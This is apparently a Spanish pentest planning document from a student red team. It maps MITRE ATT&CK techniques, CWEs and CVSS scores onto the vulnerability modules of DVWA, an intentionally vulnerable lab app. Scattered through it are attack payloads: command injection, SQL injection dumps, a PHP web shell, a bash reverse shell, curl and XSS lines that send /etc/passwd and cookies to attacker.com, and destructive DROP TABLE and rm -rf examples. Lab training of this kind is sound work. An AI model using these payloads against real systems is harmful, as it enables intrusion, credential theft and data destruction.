# Matriz MITRE ATT&CK - DVWA Penetration Testing

## Introducción

Este documento mapea todas las técnicas y tácticas de MITRE ATT&CK® que serán utilizadas durante el pentesting de DVWA. Cada técnica está vinculada a vulnerabilidades específicas y CVEs/CWEs relacionados.

**Framework**: [MITRE ATT&CK® for Enterprise](https://attack.mitre.org/matrices/enterprise/)
**Versión**: ATT&CK v16 (Enero 2025)
**Matriz**: Enterprise - Web Applications

---

## Resumen de Tácticas

| Táctica | ID | Técnicas | Descripción |
|---------|-----|----------|-------------|
| Reconnaissance | TA0043 | 2 | Recopilación de información |
| Initial Access | TA0001 | 1 | Acceso inicial a la aplicación |
| Execution | TA0002 | 3 | Ejecución de código |
| Persistence | TA0003 | 2 | Mantener acceso |
| Discovery | TA0007 | 4 | Descubrimiento de información |
| Credential Access | TA0006 | 3 | Obtención de credenciales |
| Collection | TA0009 | 2 | Recopilación de datos |
| Exfiltration | TA0010 | 1 | Extracción de información |
| Impact | TA0040 | 2 | Impacto en el sistema |

**Total**: 9 tácticas, 20 técnicas únicas

---

## Mapeo Detallado por Táctica

### TA0043: Reconnaissance (Reconocimiento)

#### T1595 - Active Scanning

**Descripción**: Escaneo activo de la aplicación y servicios

**Sub-técnicas**:
- **T1595.001** - Scanning IP Blocks
- **T1595.002** - Vulnerability Scanning

**Aplicación en DVWA**:
- Escaneo de puertos con nmap
- Escaneo de vulnerabilidades web con Nikto
- Fingerprinting de servicios HTTP/MySQL
- Detección de tecnologías (PHP, MySQL, Apache)

**Herramientas**:
- nmap
- nikto
- whatweb
- wafw00f

**Evidencias esperadas**:
- Resultados de nmap (XML/TXT)
- Reporte de nikto
- Lista de servicios y versiones

---

#### T1595.003 - Active Scanning: Wordlist Scanning

**Descripción**: Búsqueda de directorios y archivos ocultos

**Aplicación en DVWA**:
- Fuzzing de directorios
- Búsqueda de archivos de backup
- Enumeración de parámetros

**Herramientas**:
- gobuster
- dirb
- wfuzz

---

### TA0001: Initial Access (Acceso Inicial)

#### T1190 - Exploit Public-Facing Application

**Descripción**: Explotación de vulnerabilidades en aplicación web pública

**Aplicación en DVWA** (todas las vulnerabilidades):
- SQL Injection
- XSS (Reflected, Stored, DOM)
- Command Injection
- File Upload
- File Inclusion
- CSRF

**CVEs Relacionados**:
- CVE-2019-20933 - SQL Injection in DVWA
- CVE-2019-16759 - Command Injection concepts
- CWE-89 - SQL Injection
- CWE-79 - Cross-site Scripting
- CWE-78 - OS Command Injection

**OWASP Top 10**:
- A03:2021 - Injection
- A01:2021 - Broken Access Control

**Herramientas**:
- sqlmap
- Burp Suite
- Manual exploitation
- XSSer

**Evidencias**:
- PoC de cada vulnerabilidad
- Screenshots de explotación exitosa
- Payloads utilizados

---

### TA0002: Execution (Ejecución)

#### T1059 - Command and Scripting Interpreter

**Sub-técnicas aplicables**:

##### T1059.004 - Unix Shell

**Descripción**: Ejecución de comandos del sistema operativo

**Aplicación en DVWA**:
- **Command Injection**: Inyección de comandos Linux
  ```bash
  ; cat /etc/passwd
  | whoami
  && id
  ```
- Ejecución de comandos arbitrarios vía shell

**CWE**: CWE-78 (OS Command Injection)

**Severidad**: CRÍTICA (CVSS 9.8)

**Herramientas**:
- Manual testing
- Burp Repeater

**Evidencias**:
- Output de comandos ejecutados
- Screenshot de shell interactiva

---

##### T1059.007 - JavaScript

**Descripción**: Ejecución de código JavaScript en navegador

**Aplicación en DVWA**:
- **XSS Reflected**:
  ```javascript
  <script>alert(document.cookie)</script>
  ```
- **XSS Stored**:
  ```javascript
  <script>
  fetch('http://attacker.com/?c='+document.cookie)
  </script>
  ```
- **XSS DOM-based**

**CWE**: CWE-79 (Cross-site Scripting)

**Severidad**: ALTA (CVSS 7.1)

**Herramientas**:
- Manual testing
- XSSer
- Browser Developer Tools

---

##### T1059.001 - PowerShell (No aplica en DVWA - Linux)

##### T1059.006 - Python

**Aplicación en DVWA**:
- Scripts Python personalizados para automatización
- Explotación con scripts custom

---

#### T1203 - Exploitation for Client Execution

**Descripción**: XSS para ejecutar código en navegador de víctima

**Aplicación en DVWA**:
- XSS Stored con payload malicioso
- BeEF Framework integration
- Session hijacking via XSS

---

#### T1505 - Server Software Component

##### T1505.003 - Web Shell

**Descripción**: Upload y ejecución de web shell

**Aplicación en DVWA**:
- **File Upload**: Subir shell PHP
  ```php
  <?php system($_GET['cmd']); ?>
  ```
- **File Inclusion**: Ejecutar shell remoto via RFI

**CWE**: CWE-434 (Unrestricted Upload of File)

**Severidad**: CRÍTICA (CVSS 9.8)

**Herramientas**:
- Weevely
- PHP reverse shell
- Custom shells

**Evidencias**:
- Shell subido y funcionando
- Ejecución de comandos vía shell

---

### TA0003: Persistence (Persistencia)

#### T1505.003 - Server Software Component: Web Shell

**Descripción**: Mantener acceso mediante web shell persistente

**Aplicación en DVWA**:
- Subir backdoor PHP en directorio con permisos de escritura
- Establecer cron job (si se obtiene shell)

---

#### T1136 - Create Account

**Descripción**: Crear cuenta de usuario en aplicación

**Aplicación en DVWA**:
- Crear usuario adicional vía SQL Injection
  ```sql
  INSERT INTO users VALUES (NULL,'backdoor','5f4dcc3b5aa765d61d8327deb882cf99','backdoor','backdoor','avatar.png','0')
  ```

**Evidencias**:
- Nuevo usuario creado
- Login con cuenta creada

---

### TA0007: Discovery (Descubrimiento)

#### T1046 - Network Service Scanning

**Descripción**: Identificación de servicios de red

**Aplicación**:
- Escaneo de puertos: 80 (HTTP), 3306 (MySQL)
- Identificación de servicios activos

**Herramientas**:
- nmap
- netstat (desde shell comprometida)

---

#### T1083 - File and Directory Discovery

**Descripción**: Enumeración de archivos y directorios

**Aplicación en DVWA**:
- **File Inclusion (LFI)**:
  ```
  ?page=../../etc/passwd
  ?page=../../var/www/html/config/config.inc.php
  ```
- Lectura de archivos de configuración
- Descubrimiento de credenciales

**CWE**: CWE-22 (Path Traversal)

**Evidencias**:
- Contenido de /etc/passwd
- Credenciales de BD desde config.inc.php

---

#### T1087 - Account Discovery

**Descripción**: Enumeración de cuentas de usuario

**Aplicación en DVWA**:
- **SQL Injection** para enumerar usuarios:
  ```sql
  ' UNION SELECT NULL,user,password,NULL,NULL,NULL,NULL FROM users-- -
  ```
- Dump de tabla users completa

**Evidencias**:
- Lista de usuarios y hashes

---

#### T1082 - System Information Discovery

**Descripción**: Recopilación de información del sistema

**Aplicación en DVWA**:
- **Command Injection**:
  ```bash
  ; uname -a
  ; cat /etc/os-release
  ```
- Información de versión PHP: `<?php phpinfo(); ?>`

---

### TA0006: Credential Access (Acceso a Credenciales)

#### T1110 - Brute Force

**Sub-técnicas**:

##### T1110.001 - Password Guessing

**Descripción**: Adivinanza de contraseñas

**Aplicación en DVWA**:
- **Brute Force module**: Ataque al formulario de login
- Diccionario de contraseñas comunes

**Herramientas**:
- Hydra
- Burp Intruder
- Custom Python script

**Comando ejemplo**:
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 172.20.0.3 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect"
```

**Evidencias**:
- Credenciales descubiertas
- Log de intentos de Hydra

---

##### T1110.003 - Password Spraying

**Descripción**: Probar una contraseña común contra múltiples usuarios

**Aplicación**:
- Probar "password", "admin123", "123456" contra todos los usuarios

---

#### T1555 - Credentials from Password Stores

**Descripción**: Obtención de credenciales almacenadas

**Aplicación en DVWA**:
- **SQL Injection** para dump de passwords:
  ```sql
  ' UNION SELECT NULL,user,password,NULL,NULL,NULL,NULL FROM users-- -
  ```
- Extracción de hashes MD5

**Post-explotación**:
- Cracking de hashes MD5 con John the Ripper
  ```bash
  john --format=raw-md5 hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
  ```

---

#### T1552 - Unsecured Credentials

##### T1552.001 - Credentials In Files

**Descripción**: Credenciales en archivos de configuración

**Aplicación en DVWA**:
- **LFI** para leer `config.inc.php`:
  ```php
  $_DVWA[ 'db_user' ] = 'dvwa';
  $_DVWA[ 'db_password' ] = 'dvwa_password';
  ```

**Evidencias**:
- Credenciales de MySQL obtenidas

---

### TA0009: Collection (Recopilación)

#### T1213 - Data from Information Repositories

**Descripción**: Extracción de datos de repositorios (bases de datos)

**Aplicación en DVWA**:
- **SQL Injection** para dump completo de BD:
  ```bash
  sqlmap -u "http://172.20.0.3/vulnerabilities/sqli/?id=1&Submit=Submit" \
         --cookie="PHPSESSID=xxx; security=low" \
         --dump
  ```
- Extracción de tabla `users`
- Extracción de tabla `guestbook` (XSS Stored)

**CWE**: CWE-89

**Datos obtenidos**:
- Usuarios y passwords (hashed)
- Información personal simulada
- Comentarios del guestbook

---

#### T1005 - Data from Local System

**Descripción**: Recopilación de datos del sistema local

**Aplicación en DVWA**:
- Via Command Injection o Web Shell:
  ```bash
  cat /etc/passwd
  find / -name "*.conf" 2>/dev/null
  ```

---

### TA0010: Exfiltration (Exfiltración)

#### T1041 - Exfiltration Over C2 Channel

**Descripción**: Exfiltración de datos sobre canal de comando y control

**Aplicación en DVWA**:
- **XSS Stored** para enviar cookies a servidor externo:
  ```javascript
  <script>
  var i=new Image();
  i.src="http://attacker.com/steal.php?cookie="+document.cookie;
  </script>
  ```
- **Command Injection** para enviar datos:
  ```bash
  ; curl -X POST -d @/etc/passwd http://attacker.com/
  ```

---

### TA0040: Impact (Impacto)

#### T1485 - Data Destruction

**Descripción**: Destrucción de datos

**Aplicación en DVWA** (solo para demostración, NO ejecutar):
- **SQL Injection**:
  ```sql
  '; DROP TABLE users-- -
  ```
- **Command Injection**:
  ```bash
  ; rm -rf /var/www/html/*
  ```

**Nota**: Solo documentar, NO ejecutar en pruebas reales

---

#### T1499 - Endpoint Denial of Service

**Descripción**: Denegación de servicio

**Aplicación** (solo conceptual):
- SQL Injection con queries pesadas
- Subida masiva de archivos

**Nota**: Fuera de scope - No realizar DoS

---

## Matriz Visual de Técnicas por Módulo DVWA

| Módulo DVWA | Técnicas ATT&CK | CWE | CVSS |
|-------------|-----------------|-----|------|
| **Brute Force** | T1110.001 (Password Guessing) | CWE-307 | 7.5 |
| **Command Injection** | T1059.004 (Unix Shell)<br>T1083 (File Discovery)<br>T1082 (System Info) | CWE-78 | 9.8 |
| **CSRF** | T1659 (Content Injection) | CWE-352 | 6.5 |
| **File Inclusion** | T1083 (File Discovery)<br>T1552.001 (Creds in Files) | CWE-22 | 8.6 |
| **File Upload** | T1505.003 (Web Shell)<br>T1059.004 (Unix Shell) | CWE-434 | 9.8 |
| **SQL Injection** | T1213 (Data from Repos)<br>T1087 (Account Discovery)<br>T1555 (Creds from Stores) | CWE-89 | 9.8 |
| **SQL Injection (Blind)** | T1213 (Data from Repos) | CWE-89 | 9.1 |
| **Weak Session IDs** | T1539 (Session Hijacking) | CWE-331 | 8.1 |
| **XSS (Reflected)** | T1059.007 (JavaScript)<br>T1203 (Client Execution) | CWE-79 | 7.1 |
| **XSS (Stored)** | T1059.007 (JavaScript)<br>T1041 (Exfil Over C2) | CWE-79 | 8.8 |
| **XSS (DOM)** | T1059.007 (JavaScript) | CWE-79 | 7.1 |
| **CSP Bypass** | T1562.001 (Disable Security Tools) | CWE-1021 | 6.1 |

---

## Kill Chain Completa - Ejemplo de Ataque

### Fase 1: Reconnaissance
- **T1595.002**: Nikto scan → Identificar vulnerabilidades
- **T1046**: Nmap scan → Puertos 80, 3306 abiertos

### Fase 2: Initial Access
- **T1190**: Explotar SQL Injection
  - URL: `?id=1' OR '1'='1`

### Fase 3: Execution
- **T1059.004**: Command Injection
  - Payload: `; bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'`

### Fase 4: Persistence
- **T1505.003**: Upload web shell (backdoor.php)
  - Vía File Upload vulnerability

### Fase 5: Privilege Escalation
- **T1068**: Buscar exploit local (desde shell)
  - LinPEAS para enumerar

### Fase 6: Credential Access
- **T1555**: Dump passwords via SQLi
- **T1552.001**: Leer config.inc.php vía LFI

### Fase 7: Discovery
- **T1083**: Enumerar archivos con `find`
- **T1087**: Listar usuarios de MySQL

### Fase 8: Collection
- **T1213**: Dump completo de BD con sqlmap

### Fase 9: Exfiltration
- **T1041**: Enviar datos vía curl a C2 externo

---

## Mapeo a OWASP Top 10 2021

| OWASP 2021 | Técnicas ATT&CK | Módulos DVWA Afectados |
|------------|-----------------|------------------------|
| **A01:2021 - Broken Access Control** | T1190, T1083 | File Inclusion, CSRF |
| **A03:2021 - Injection** | T1059.004, T1213 | SQL Injection, Command Injection |
| **A05:2021 - Security Misconfiguration** | T1595.002, T1082 | Todos (security level: low) |
| **A07:2021 - Identification and Authentication Failures** | T1110.001, T1539 | Brute Force, Weak Session IDs |

---

## Referencias y Recursos

- [MITRE ATT&CK®](https://attack.mitre.org/)
- [ATT&CK Navigator](https://mitre-attack.github.io/attack-navigator/)
- [CVE Database](https://cve.mitre.org/)
- [CWE Top 25](https://cwe.mitre.org/top25/)
- [OWASP Top 10 2021](https://owasp.org/Top10/)
- [CVSS Calculator 3.1](https://www.first.org/cvss/calculator/3.1)

---

## Uso de esta Matriz

### Durante el Pentesting:
1. Para cada vulnerabilidad explotada, registrar la técnica ATT&CK utilizada
2. Capturar evidencias específicas para cada técnica
3. Documentar el procedimiento exacto (TTPs completos)

### En el Informe:
1. Incluir esta matriz en sección de Metodología
2. Para cada hallazgo, referenciar técnicas ATT&CK
3. Usar IDs de técnicas en títulos de hallazgos

### Ejemplo de Hallazgo:
```
Título: [T1213][CWE-89] SQL Injection en módulo Login
Técnica: T1213 - Data from Information Repositories
CWE: CWE-89 - SQL Injection
CVSS: 9.8 (Critical)
...
```

---

**Fecha de creación**: Diciembre 2025
**Versión de ATT&CK**: v16
**Autor**: Red Team - PAI-5 Security Team
**Última actualización**: Inicio del proyecto
